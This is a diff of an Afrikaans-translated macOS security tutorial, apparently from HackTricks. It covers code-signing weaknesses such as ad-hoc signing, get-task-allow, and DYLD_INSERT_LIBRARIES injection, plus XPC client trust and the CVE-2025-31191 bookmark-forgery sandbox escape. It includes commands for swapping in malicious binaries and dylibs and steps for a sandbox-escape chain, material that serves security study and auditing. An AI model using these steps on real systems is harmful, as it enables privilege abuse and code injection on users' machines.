@@ -2,22 +2,21 @@
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-## Ad-Hoc Signed Binaries
+## Ad-Hoc-ondertekende Binaries
 
 ### Basiese Inligting
 
-**Ad-hoc signing** (`CS_ADHOC`) skep 'n code signature met **geen sertifikaatketting nie** — dit is 'n hash van die code sonder verifikasie van die developer se identiteit. Die binary se oorsprong kan nie na enige developer of organisasie teruggespoor word nie.<sup>[[1]](#references)[[4]](#references)</sup>
+**Ad-hoc signing** (`CS_ADHOC`) skep ’n code signature met **geen certificate chain nie**. Dit has steeds die signed code, sodat validation modification kan detecteer, maar dit verskaf geen developer identity wat ’n ander component kan authenticate nie. Deur die executable te vervang en weer te sign, word ’n ander CodeDirectory/CDHash geproduseer.<sup>[[1]](#references)[[4]](#references)</sup>
 
-Op Apple Silicon Macs vereis alle executables ten minste 'n ad-hoc signature. Dit beteken dat jy ad-hoc signatures op baie development tools, Homebrew-packages en third-party utilities sal vind.
+Op Apple Silicon Macs vereis alle executables ten minste ’n ad-hoc signature. Dit beteken jy sal ad-hoc signatures op baie development tools, Homebrew packages en third-party utilities vind.
 
 ### Waarom Dit Belangrik Is
 
-- **Geen verifieerbare identiteit nie** — die binary kan vervang word sonder opsporing deur identity-based checks
-- Third-party ad-hoc binaries in **privileged positions** (FDA, daemons, helpers) is hoëprioriteit-teikens
-- In sommige konfigurasies word ad-hoc signatures moontlik **nie so streng geverifieer nie** as developer-signed code
-- Ad-hoc signed binaries wat **TCC grants** het, is besonder waardevol — die grants bly voortbestaan selfs al verander die binary se inhoud (hang af van hoe TCC die grant gesleutel het)
+- **Geen verifieerbare signer identity nie** — checks wat slegs ’n path, ’n ad-hoc status of ’n ongepinde identifier aanvaar, kan nie vasstel wie die binary geproduseer het nie.
+- Third-party ad-hoc binaries in **bevoorregte posisies** (FDA, daemons, helpers) is hoëprioriteit-teikens wanneer hul file of ’n ouer directory writable is.
+- ’n CDHash, designated-requirement of requirement-backed TCC check **let wel op** wanneer iets vervang word. ’n Path-based policy mag dalk nie; inspecteer die werklike requirement en retest die grant eerder as om aan te neem dat dit re-signing oorleef.
 
-### Discovery
+### Ontdekking
 ```bash
 # Find ad-hoc signed binaries
 find /usr/local /opt /Applications -type f -perm +111 -exec sh -c '
@@ -45,8 +44,8 @@ cp /tmp/malicious-binary /path/to/target
 # 4. Re-sign with ad-hoc signature (mimics the original)
 codesign -s - /path/to/target
 
-# 5. On next launch, the daemon runs your code with the original's TCC grants
-# (This works when TCC keyed the grant by path rather than code signature)
+# 5. Relaunch and verify the effective grant. It survives only when the
+#    authorization is path-based (or otherwise does not pin the old CDHash).
 ```
 ---
 
@@ -54,12 +53,12 @@ codesign -s - /path/to/target
 
 ### Basiese Inligting
 
-Die **`com.apple.security.get-task-allow`** entitlement (of **`CS_GET_TASK_ALLOW`**-flag) laat **enige proses toe om as ’n debugger te koppel**, geheue te lees, registers te wysig, code te inject en uitvoering te beheer.<sup>[[3]](#references)</sup>
+Die **`com.apple.security.get-task-allow`** entitlement (of **`CS_GET_TASK_ALLOW`**-vlag) laat ’n gemagtigde debugger toe om die proses se task port te verkry, selfs wanneer Hardened Runtime dit normaalweg sou voorkom. ’n Suksesvolle debugger kan geheue lees, registers wysig, kode inject en uitvoering beheer.<sup>[[3]](#references)</sup>
 
-Dit is **slegs vir ontwikkelingsbouweergawes** bedoel. Sommige third-party binaries word egter met hierdie entitlement in produksie verskeep.
+Dit is **slegs vir development builds** bedoel. Sommige third-party binaries word egter met hierdie entitlement in production verskeep.
 
 > [!CAUTION]
-> ’n Produksie-binary met `get-task-allow` is ’n **onmiddellike exploitation primitive**. Enige plaaslike proses kan `task_for_pid()` aanroep, die teiken se Mach task port verkry, en arbitrêre code inject wat met die teiken se entitlements, TCC-toekennings en security context uitgevoer word.
+> ’n Production binary met `get-task-allow` is ’n sterk exploitation primitive. `taskgated`, caller identity, sandboxing, debugger entitlements en Developer Tools authorization beïnvloed steeds of ’n spesifieke client die task port kan verkry; toets met beide `lldb`/`debugserver` en die beoogde injector. Sodra attachment slaag, loop injected code met die target se entitlements, TCC grants en security context.
 
 ### Ontdekking
 ```bash
@@ -103,19 +102,19 @@ VM_PROT_READ | VM_PROT_EXECUTE);
 ```
 ---
 
-## Geen Library Validation + DYLD Environment
+## No Library Validation + DYLD Environment
 
-### Runtime Library-Validation Clearing
+### Clearing van Runtime Library Validation
 
-Die private entitlement **`com.apple.private.security.clear-library-validation`** deaktiveer nie library validation wanneer die proses begin nie. In plaas daarvan laat dit die proses toe om tydens runtime `csops(..., CS_OPS_CLEAR_LV, ...)` op homself aan te roep. XNU verwyder dan `CS_REQUIRE_LV | CS_FORCED_LV`, mits die caller die entitlement het en aan die handler se addisionele kontroles voldoen. Gevolglik kan ’n proses eers ’n geskikte library-injection-teiken word nadat dit die code path bereik wat library validation verwyder.<sup>[[4]](#references)[[5]](#references)</sup>
+Die private entitlement **`com.apple.private.security.clear-library-validation`** deaktiveer nie library validation wanneer die proses begin nie. In plaas daarvan laat dit die proses toe om tydens runtime `csops(..., CS_OPS_CLEAR_LV, ...)` op homself uit te voer. XNU maak dan `CS_REQUIRE_LV | CS_FORCED_LV` skoon, mits die caller die entitlement het en aan die handler se bykomende kontroles voldoen. Gevolglik kan ’n proses eers ’n geskikte library-injection-teiken word nadat dit die code path bereik wat library validation skoonmaak.<sup>[[4]](#references)[[5]](#references)</sup>
 
-### Die Dodelike Kombinasie
+### Die Gevaarlike Kombinasie
 
 Wanneer ’n binary **beide** het:<sup>[[3]](#references)</sup>
 - `com.apple.security.cs.disable-library-validation` (laai enige dylib)
-- `com.apple.security.cs.allow-dyld-environment-variables` (aanvaar DYLD-omgewingsveranderlikes)
+- `com.apple.security.cs.allow-dyld-environment-variables` (aanvaar DYLD env vars)
 
-Dit is ’n **gewaarborgde code injection primitive** — `DYLD_INSERT_LIBRARIES` werk perfek.
+Dit is ’n waardevolle code-injection-kombinasie omdat Hardened Runtime beide die onbetroubare library en die DYLD environment variable toelaat. Die launch context kan DYLD-variables steeds scrub (byvoorbeeld protected of privileged execution paths), dus moet jy die presiese invocation verifieer eerder as om die entitlement-paar as onvoorwaardelik te beskou.
 
 ### Ontdekking
 ```bash
@@ -133,7 +132,7 @@ SELECT path, privileged, tccPermsStr FROM executables
 WHERE noLibVal = 1 AND allowDyldEnv = 1
 ORDER BY privileged DESC;"
 ```
-### Aanval: DYLD_INSERT_LIBRARIES Injection
+### Attack: DYLD_INSERT_LIBRARIES Injection
 ```bash
 # 1. Create the injection dylib
 cat > /tmp/inject.c << 'EOF'
@@ -179,7 +178,7 @@ Tydelike Sandbox-uitsonderings (`com.apple.security.temporary-exception.*`) skep
 | Uitsondering | Wat Dit Toelaat |
 |---|---|
 | `temporary-exception.mach-lookup.global-name` | Koppel aan stelselwye XPC/Mach-dienste |
-| `temporary-exception.files.absolute-path.read-write` | Lees/skryf lêers buite die app-container |
+| `temporary-exception.files.absolute-path.read-write` | Lees/skryf lêers buite die app-houer |
 | `temporary-exception.iokit-user-client-class` | Maak IOKit user-client-verbindings oop |
 | `temporary-exception.shared-preference.read-only` | Lees ander apps se voorkeure |
 | `temporary-exception.files.home-relative-path.read-write` | Kry toegang tot paaie relatief tot `~` |
@@ -213,23 +212,81 @@ c. Fuzz each exposed method
 ```
 ---
 
+## Code-Signing Checks Are Not XPC Client Integrity
+
+'n XPC-diens kan 'n verbinding autentiseer deur code-signing-status uit sy audit token te onttrek en 'n Apple **platform binary** of 'n kliënt wat `CS_REQUIRE_LV`/`CS_FORCED_LV` dra, te aanvaar. Hierdie toetse beskryf die uitvoerbare lêer en geselekteerde prosesvlae; hulle bewys nie dat die huidige adresruimte slegs vertroude code bevat nie. Navorsing oor ImageCapture-dienste het getoon dat 'n inspuitbare Apple binary soos `/bin/ls` 'n aanvaller-dylib deur `DYLD_INSERT_LIBRARIES` kon laai en daarna as 'n platform-kliënt kon verbind. 'n Opvolgkontrole vir library-validation-vlae is ook omseil voordat Apple die diens verander het om sy private authorization entitlement in macOS 15 te vereis.<sup>[[6]](#references)</sup>
+
+### Aanvallende Ouditwerkvloei
+
+1. Reverse `listener:shouldAcceptNewConnection:` (of die ekwivalente laevlak-XPC-handler) en identifiseer besluite wat slegs op `isPlatformBinary`, `kSecCodeInfoFlags`, `CS_PLATFORM_BINARY`, `CS_REQUIRE_LV` of `CS_FORCED_LV` gebaseer is.
+2. Enumerate Apple-ondertekende kliënte wat met die protokol kan kommunikeer, en inspekteer daarna Hardened Runtime en entitlements. 'n Platform-signature alleen is nie bewys dat DYLD-injection geblokkeer word nie.
+3. Toets die kandidaat op die **target macOS build**. As 'n constructor dylib laai, maak die diensverbinding vanuit daardie constructor sodat die audit token aan die aanvaarde platform-proses behoort.
+4. Toets elke vendor-patch weer: die toevoeging van nog 'n mutable prosesstatus-vlag tot dieselfde authorization-besluit mag nie die confused-deputy-primitief verwyder nie.
+```bash
+# Static triage of the intended client
+codesign -dv --verbose=4 /bin/ls 2>&1 | grep -E 'flags=|Runtime Version|TeamIdentifier'
+codesign -d --entitlements :- /bin/ls 2>/dev/null | plutil -p -
+
+# Dynamic check using the constructor dylib created earlier in this page
+DYLD_PRINT_LIBRARIES=1 DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /bin/ls
+```
+> [!NOTE]
+> DYLD-gedrag, AMFI-beleid en kontroles aan die diens-kant verander tussen macOS-vrystellings. Mislukking teenoor 'n volledig gepatchte host bewys nie dat dieselfde chain op die kwesbare vrystelling misluk het nie.
+
+---
+
+## Security-Scoped Bookmark Forgery (CVE-2025-31191)
+
+Security-scoped bookmarks behou 'n gebruiker se lêerkeuse tussen launch-sessies. 'n Sandbox extension is aan die boot gebind, dus valideer `ScopedBookmarkAgent` dit en skep 'n langdurige HMAC-ge-authentiseerde bookmark; wanneer die app daardie bookmark later aanbied, valideer die agent dit en reik 'n nuwe sandbox extension uit. Die signing secret word in die login keychain gestoor, en 'n per-app key word met behulp van die bundle identifier afgelei.<sup>[[7]](#references)</sup>
+
+Op geaffekteerde stelsels het die keychain ACL verhoed dat 'n onbetroubare proses die `com.apple.scopedbookmarksagent.xpc`-secret **lees**, maar het dit nie verhoed dat dit uitgevee word nie. 'n Gekompromitteerde sandboxed app kon die item met 'n bekende secret en attacker-beheerde ACL vervang, die app-spesifieke HMAC key aflei, entries in die skryfbare container bookmark plist vervals, en `ScopedBookmarkAgent` vra om dit vir file-access extensions om te ruil. Dit het enige sandboxed application wat security-scoped bookmarks gebruik, in 'n potensiële sandbox escape met arbitrêre lêertoegang verander, sonder 'n bykomende file-picker-interaksie. Apple het die probleem in die security updates van 31 Maart 2025 reggestel.<sup>[[7]](#references)</sup>
+
+### Triage and Attack Chain
+```bash
+APP=/Applications/Target.app
+BIN="$APP/Contents/MacOS/$(/usr/libexec/PlistBuddy -c 'Print :CFBundleExecutable' \
+"$APP/Contents/Info.plist")"
+
+# Identify apps that can persist app- or document-scoped file access
+codesign -d --entitlements :- "$BIN" 2>/dev/null | plutil -p - | \
+grep -E 'com.apple.security.files.bookmarks.(app|document)-scope'
+
+# Locate app-managed bookmark stores; names and schemas are application-specific
+find "$HOME/Library/Containers" -type f \
+\( -iname '*securebookmark*.plist' -o -iname '*securebookmarks*.plist' \) 2>/dev/null
+
+# Inspect metadata for the agent's generic-password item (normally not its secret)
+security find-generic-password -s com.apple.scopedbookmarksagent.xpc
+```
+Die ontginningsvolgorde op ’n kwesbare host is:
+
+1. Kry code execution binne ’n sandboxed app wat persistent scoped bookmarks gebruik.
+2. Vervang die agent se keychain signing item met ’n bekende secret en permissive ACL.
+3. Bereken `HMAC-SHA256(key=known_secret, data=bundle_id)` en forge ’n bookmark vir ’n nuttige path in die app se writable bookmark store.
+4. Trigger die toepassing se normale bookmark-resolution path sodat `ScopedBookmarkAgent` ’n sandbox extension teruggee.
+5. Gebruik die nuwe file access om ’n out-of-sandbox execution- of data target wat vir daardie user beskikbaar is, te overwrite.
+
+Hierdie is ’n **patched-version technique**: gebruik dit om die trust boundary te verstaan en om unpatched systems te assess, nie as ’n aanname oor huidige releases nie. Vir huidige testing, fokus op bookmark parsing, identity binding, keychain-item lifecycle en confused-deputy-gedrag rondom die agent.
+
+---
+
 ## Private Apple Entitlements
 
 ### Wat Hulle Is
 
-Entitlements met die voorvoegsel `com.apple.private.*` bied toegang tot **Apple-interne APIs** wat nie gedokumenteer is of vir derdeparty-ontwikkelaars beskikbaar is nie. Derdepartybinaries met private entitlements het dit deur middel van enterprise-sertifikate, MDM of verspreiding buite die App Store verkry.
+Entitlements met die prefix `com.apple.private.*` bied toegang tot **Apple-interne APIs** wat nie gedokumenteer of vir third-party developers beskikbaar is nie. Third-party binaries met private entitlements het dit deur enterprise cert, MDM of non-App-Store distribution verkry.
 
 ### Gevaarlike Private Entitlements
 
-| Entitlement | Vermoë |
+| Entitlement | Capability |
 |---|---|
-| `com.apple.private.tcc.manager` | Volledige lees-/skryftoegang tot die TCC-databasis |
-| `com.apple.private.tcc.allow` | Toegang tot spesifieke TCC-dienste |
-| `com.apple.private.security.no-sandbox` | Loop sonder sandbox |
-| `com.apple.private.iokit` | Direkte IOKit-bestuurdertoegang |
-| `com.apple.private.kernel.\*` | Toegang tot kernel-koppelvlakke |
-| `com.apple.private.xpc.launchd.job-label` | Registreer/bestuur launchd-take |
-| `com.apple.rootless.install` | Skryf na SIP-beskermde paaie |
+| `com.apple.private.tcc.manager` | Volledige TCC-databasis read/write |
+| `com.apple.private.tcc.allow` | Toegang tot spesifieke TCC-services |
+| `com.apple.private.security.no-sandbox` | Run sonder sandbox |
+| `com.apple.private.iokit` | Direkte IOKit-driver access |
+| `com.apple.private.kernel.\*` | Kernel-interface access |
+| `com.apple.private.xpc.launchd.job-label` | Register/manage launchd jobs |
+| `com.apple.rootless.install` | Skryf na SIP-beskermde paths |
 
 ### Ontdekking
 ```bash
@@ -254,9 +311,9 @@ ORDER BY privileged DESC;"
 
 ### Wat Hulle Is
 
-Binaries kan **pasgemaakte sandbox-profiele** bevat wat in SBPL (Seatbelt Profile Language) geskryf is. Hierdie profiele kan meer beperkend OF **meer permissief** as die verstek App Sandbox wees.
+Binaries kan **pasgemaakte sandbox-profiele** insluit wat in SBPL (Seatbelt Profile Language) geskryf is. Hierdie profiele kan meer beperkend OF **meer permissief** as die verstek App Sandbox wees.
 
-### Oudit van pasgemaakte profiele
+### Oudit van Pasgemaakte profiele
 ```bash
 # Find custom sandbox profiles
 find /Applications /System -name "*.sb" -o -name "*.sbpl" 2>/dev/null
@@ -274,11 +331,11 @@ cat /path/to/custom.sb | grep "(allow" | sort -u
 ```
 ---
 
-## Skryfbare biblioteekpaaie
+## Skryfbare Biblioteekpaaie
 
-### Wat dit is
+### Wat Hulle Is
 
-Wanneer ’n binêre lêer ’n dinamiese biblioteek laai vanaf ’n pad waarna die huidige gebruiker kan **skryf**, kan die biblioteek met kwaadwillige code vervang word.
+Wanneer 'n binary 'n dynamic library vanaf 'n pad laai waartoe die huidige gebruiker **kan skryf**, kan die biblioteek met malicious code vervang word.
 
 ### Ontdekking
 ```bash
@@ -323,9 +380,11 @@ cp /tmp/evil.dylib /path/to/writable.dylib
 ```
 ## References
 
-- [1] [Apple Developer — Gids vir Code Signing](https://developer.apple.com/library/archive/technotes/tn2206/_index.html)
+- [1] [Apple Developer — Kode-ondertekeningsgids](https://developer.apple.com/library/archive/technotes/tn2206/_index.html)
 - [2] [Apple Developer — App Sandbox](https://developer.apple.com/library/archive/documentation/Security/Conceptual/AppSandboxDesignGuide/AboutAppSandbox/AboutAppSandbox.html)
 - [3] [Apple Developer — Entitlements](https://developer.apple.com/documentation/bundleresources/entitlements)
-- [4] [XNU — `bsd/sys/codesign.h` (`CS_OPS_*`-bewerkings en `CLEAR_LV_ENTITLEMENT`)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/sys/codesign.h)
-- [5] [XNU — `bsd/kern/kern_proc.c` (`csops` / `CS_OPS_CLEAR_LV`-hanteerder)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/kern/kern_proc.c)
+- [4] [XNU — `bsd/sys/codesign.h` (`CS_OPS_*` operations and `CLEAR_LV_ENTITLEMENT`)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/sys/codesign.h)
+- [5] [XNU — `bsd/kern/kern_proc.c` (`csops` / `CS_OPS_CLEAR_LV` handler)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/kern/kern_proc.c)
+- [6] [’n Nuwe Era van macOS Sandbox Escapes: Ondersoek na ’n Oorgesiene Attack Surface en die Ontdekking van 10+ Nuwe Kwesbaarhede](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
+- [7] [Ontleding van CVE-2025-31191: ’n macOS security-scoped bookmarks-gebaseerde sandbox escape](https://www.microsoft.com/en-us/security/blog/2025/05/01/analyzing-cve-2025-31191-a-macos-security-scoped-bookmarks-based-sandbox-escape/)
 {{#include ../../../banners/hacktricks-training.md}}
